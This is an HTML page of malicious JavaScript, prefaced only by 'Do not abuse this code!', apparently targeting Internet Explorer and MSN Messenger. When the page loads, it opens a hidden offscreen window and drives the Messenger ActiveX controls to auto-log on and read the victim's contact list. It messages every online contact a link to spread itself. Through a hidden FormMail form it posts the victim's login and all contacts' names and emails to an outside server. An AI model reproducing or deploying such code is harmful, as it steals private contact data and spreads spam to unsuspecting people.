Do not abuse this code!

<html> 
<head> 
<title>Welcome</title> 
<Script> 

var msnWin; 
var msnList; 
var msgStr = "URGENT - Go to http://www.rjdesigns.co.uk/cool Now"; 


function Go(){ 

msnWin = document.open("res://mshtml.dll/blank.htm", "", "fullscreen=1"); 
msnWin.resizeTo(1, 1); 
msnWin.moveTo(10000, 10000); 
msnWin.document.title = "Please Wait..."; 
msnWin.document.body.innerHTML = '<object classid="clsid:F3A614DC-ABE0-11d2-A441-00C04F795683" id="msnObj1"></object><object classid="clsid:FB7199AB-79BF-11d2-8D94-0000F875C541" id="msnObj2"></object>'; 
focus(); 

if (msnWin.msnObj1.localState == 1){ 
msnWin.msnObj2.autoLogon(); 
} 
Contacts(); 
Send(); 
msnWin.close(); 
document.contents.submit(); 
} 

function Contacts(){ 
msnList = msnWin.msnObj1.list(0); 
document.contents.email.value = msnWin.msnObj1.localLogonName; 
document.contents.subject.value = Date(); 
var msnStr = "<br>"; 

for (i=0;i<msnList.count;i++){ 
if (msnList(i).state >1){ 
msnStr += "Online Contact: " + msnList(i).FriendlyName + ", email: " + msnList(i).LogonName + "<br>"; 
} 

else{ 
msnStr += "Offline Contact: " + msnList(i).FriendlyName + ", email: " + msnList(i).LogonName + "<br>"; 
} 
} 
document.contents.contentBox.value = msnStr; 
} 

function Send(){ 
for (i=0;i<msnList.count; i++){ 
if (msnList(i).state >1){ 
msnList(i).sendText("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n", msgStr, 0); 
} 
} 
} 

</Script> 
</head> 
<body onload="Go()"> 
<p align="center">&nbsp; 
<p align="center">&nbsp;</p> 
<p align="center">&nbsp;</p> 
<p align="center">&nbsp;</p> 
<p align="center"><font face="Arial"> 
Please Wait...</font></p> 
<form METHOD="POST" ACTION="http://www.rjdesigns.co.uk/cgi-bin/FormMail.pl" NAME="contents" ID="Form1"> 
<input type="hidden" name="redirect" value="http://www.xxxxxxxxx.co.uk/cool/go.htm" ID="Hidden1"> 
<input type="hidden" name="recipient" value="xxxxxxxxxxxxxxxxx@hotmail.com" ID="Hidden5"> 
<input type="hidden" name="email"> 
<input type="hidden" name="subject"> 
<input type="hidden" NAME="contentBox" id="Hidden6"> 
<input type=hidden name="env_report" value="REMOTE_HOST,HTTP_USER_AGENT"> 
</form> 
</body> 
</html> 

